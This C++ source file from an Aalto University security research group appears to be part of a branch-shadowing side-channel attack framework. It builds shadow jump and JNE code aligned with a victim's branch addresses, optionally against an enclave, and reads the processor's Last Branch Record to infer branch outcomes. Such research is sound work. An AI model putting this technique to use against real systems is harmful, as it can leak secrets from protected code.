/*
 * Author: Hans Liljestrand, Shohreh Hosseinzadeh
 * Copyright: Secure Systems Group, Aalto University https://ssg.aalto.fi/
 * This code is released under Apache 2.0 license
 */

#include "Test.h"
#include "shadow/SegEaxWrite.h"
#include "shadow/SegRetq.h"
#include "shadow/SegNop.h"
#include "shadow/SegEaxAndOne.h"
#include "shadow/SegJneEaxZero.h"
#include "shadow/SegJump.h"
#include "shadow/SegSetPosInReg.h"
#include "shadow/SegJumpR13.h"
#include "shadow/SegLongJump.h"
#include "mem/Pointers.h"

void Test::prepare_attack(void *src, void *dst)
{
    assert(src != nullptr);
    assert(dst != nullptr);
    log->debug("creating shadow area for %p -> %p", src, dst);
    m_src = src;
    m_dst = dst;
    m_lbr_fd = m_lbrReader->get_fd();

    m_shadow = std::make_shared<Shadow>(lbr_entry_bits, src, dst);

    if (m_enclave != nullptr)
        m_eid = m_enclave->get_eid();
}

always_inline
inline uintptr_t Test::finish_attack(int shadow_retval)
{
    SPDLOG_TRACE(log, "finishing up");
    LbrReader::dump_lbr_inline(m_lbr_fd);
#ifdef TEST_NO_VICTIM
    log->warn("Test was run using TEST_NO_VICTIM, expecting no good results!");
#endif

    m_lbrReader->read_lbr();

    log->debug("done, shadow retval is %d", shadow_retval);


    if (m_dump_lbr)
        m_lbrReader->print_lbr_data(m_src, m_shadow_src);

    if (m_use_indirect_targets) {
        Pointers::free_indirect_pointer(m_indirect_shadow_input);
        Pointers::free_indirect_pointer(m_indirect_target_ptr);
    }

    m_shadow = nullptr;
    m_src = nullptr;
    m_dst = nullptr;

    m_stats->add_from_lbr_data(m_lbrReader->get_data_ptr(), m_shadow_src);
    SPDLOG_TRACE(log, "setting m_shadow_src to %0x016lx", m_shadow_src);
    return reinterpret_cast<uintptr_t>(m_shadow_src);
}

void *Test::setup_jmp_shadow()
{
    assert(m_shadow != nullptr);

    auto if_seg  = SegEaxWrite::make(nullptr, 1);
    auto else_seg  = SegEaxWrite::make(m_dst, 2);
    auto end_if_seg   = SegRetq::make(nullptr, 120);
    auto end_else_seg   = SegRetq::make(nullptr, 120);
    auto src_seg = m_use_indirect_targets ?
                   SegJumpR13::make(m_src) :
                   SegJump::make(m_src, else_seg);
    auto entry_seg = m_use_indirect_targets ?
                     SegSetPosInReg::make(nullptr, else_seg, m_indirect_target_ptr, 13) :
                     SegNop::make();

    log->debug("Setting up shadow from %p to %p", m_src, m_dst);

    if (m_src < m_dst) {
        log->debug("Constructing forward jmp shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *          mov %eax, 2
         * else:
         *          mov %eax, 1             // aligned to dst
         * end:
         *          retq
         * */

        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    } else {
        log->debug("Constructing backward jmp shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * if:
         *          mov %eax, 2
         *          jmp %[if_spend_time]
         *
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[exit]
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *
         * end:
         *          retq
         *
         * if_spend_time:
         *          lots of nops
         *          jmp %[end]
         *
         * else_spend_time:
         *          lots of nops
         *          jmp %[end]
         */


        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    }

    if (m_use_indirect_targets) {
        Pointers::flush_indirect_pointer(m_indirect_target_ptr);
        Pointers::flush_indirect_pointer(m_indirect_shadow_input);
    }

    m_shadow_src = src_seg->get_pos();


    auto entry_ptr = m_shadow->get_entry_ptr();
    log->info("%s: entry at %p, shadowing (ind%d) %p -> %p", __FUNCTION__, entry_ptr,
                 m_use_indirect_targets ? 1 : 0, m_src, m_shadow_src);
    return entry_ptr;
}

void *Test::setup_jmp_shadow_rev()
{
    assert(m_shadow != nullptr);

    auto if_seg  = SegEaxWrite::make(m_dst, 1);
    auto else_seg  = SegEaxWrite::make(nullptr, 2);
    auto end_if_seg   = SegRetq::make(nullptr, 120);
    auto end_else_seg   = SegRetq::make(nullptr, 120);
    auto src_seg = m_use_indirect_targets ?
                   SegJumpR13::make(m_src) :
                   SegJump::make(m_src, if_seg);
    auto entry_seg = m_use_indirect_targets ?
                     SegSetPosInReg::make(nullptr, if_seg, m_indirect_target_ptr, 13) :
                     SegNop::make();

    log->debug("Setting up shadow from %p to %p", m_src, m_dst);

    if (m_src < m_dst) {
        log->debug("Constructing forward jmp shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *          mov %eax, 2
         * else:
         *          mov %eax, 1             // aligned to dst
         * end:
         *          retq
         * */

        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    } else {
        log->debug("Constructing backward jmp shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * if:
         *          mov %eax, 2
         *          jmp %[if_spend_time]
         *
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[exit]
         *
         * entry:
         *          test
         *          jmp *%[else]            // aligned to src
         *
         * end:
         *          retq
         *
         * if_spend_time:
         *          lots of nops
         *          jmp %[end]
         *
         * else_spend_time:
         *          lots of nops
         *          jmp %[end]
         */


        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_if_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegLongJump::make(nullptr, end_else_seg));
        // entry
        m_shadow->add_entry(entry_seg);
        m_shadow->add_segment(src_seg);
        // end
        m_shadow->add_segment(end_if_seg);
        m_shadow->add_segment(end_else_seg);
        m_shadow->finalize();
    }

    if (m_use_indirect_targets) {
        Pointers::flush_indirect_pointer(m_indirect_target_ptr);
        Pointers::flush_indirect_pointer(m_indirect_shadow_input);
    }

    m_shadow_src = src_seg->get_pos();


    auto entry_ptr = m_shadow->get_entry_ptr();
    log->info("%s: entry at %p, shadowing (ind%d) %p -> %p", __FUNCTION__, entry_ptr,
                 m_use_indirect_targets ? 1 : 0, m_src, m_shadow_src);
    return entry_ptr;
}

void *Test::setup_jne_shadow()
{
    assert(m_shadow != nullptr);

    if (m_src < m_dst) {
        log->debug("Constructing regular forward JNE shadow");
        /* We have a forward jump, i.e., a typical if.
         *
         * entry:
         *          test
         *          jne *%[else]            // aligned to src
         *          mov %eax, 2
                    jmp end
         * else:
         *          mov %eax, 1             // aligned to dst
         * end:
         *          retq
         * */

        auto else_seg  = SegEaxWrite::make(m_dst, 2);
        auto end_seg   = SegRetq::make(nullptr, 0);
        auto src_seg = SegJneEaxZero::make(m_src, else_seg);

        m_shadow->add_entry(SegNop::make());
        m_shadow->add_segment(SegEaxAndOne::make());
        m_shadow->add_segment(src_seg);
        m_shadow->add_segment(SegEaxWrite::make(nullptr, 1));
        m_shadow->add_segment(SegJump::make(nullptr, end_seg));
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(end_seg);
        m_shadow->finalize();

        m_shadow_src = Pointers::add_offset(src_seg->get_pos(), SegJneEaxZero::jne_offset);
    } else {
        log->debug("Constructing backward JNE shadow");
        /* We have a backward jump (maybe retpoline)
         *
         * if:
         *          mov %eax, 2
         *          jmp %[exit]
         *
         * else:
         *          mov %eax, 1             // aligned to dst
         *          jmp %[exit]
         *
         * entry:
         *          test
         *          jne *%[else]            // aligned to src
         *          jmp *%[if]
         * end:
         *          retq
         *
         */

        auto if_seg  = SegEaxWrite::make(nullptr, 1);
        auto else_seg  = SegEaxWrite::make(m_dst, 2);
        auto end_seg   = SegRetq::make(nullptr, 0);
        auto src_seg = SegJneEaxZero::make(m_src, else_seg);

        // if
        m_shadow->add_segment(if_seg);
        m_shadow->add_segment(SegJump::make(nullptr, end_seg));
        // else
        m_shadow->add_segment(else_seg);
        m_shadow->add_segment(SegJump::make(nullptr, end_seg));
        // entry
        m_shadow->add_entry(SegEaxAndOne::make());
        m_shadow->add_segment(src_seg);
        m_shadow->add_segment(SegJump::make(nullptr, if_seg));
        // end
        m_shadow->add_segment(end_seg);
        m_shadow->finalize();

        m_shadow_src = Pointers::add_offset(src_seg->get_pos(), SegJneEaxZero::jne_offset);
    }

    auto entry_ptr = m_shadow->get_entry_ptr();
    log->info("%s: entry at %p, shadowing %p -> %p", __FUNCTION__, entry_ptr, m_src, m_shadow_src);
    return entry_ptr;
}
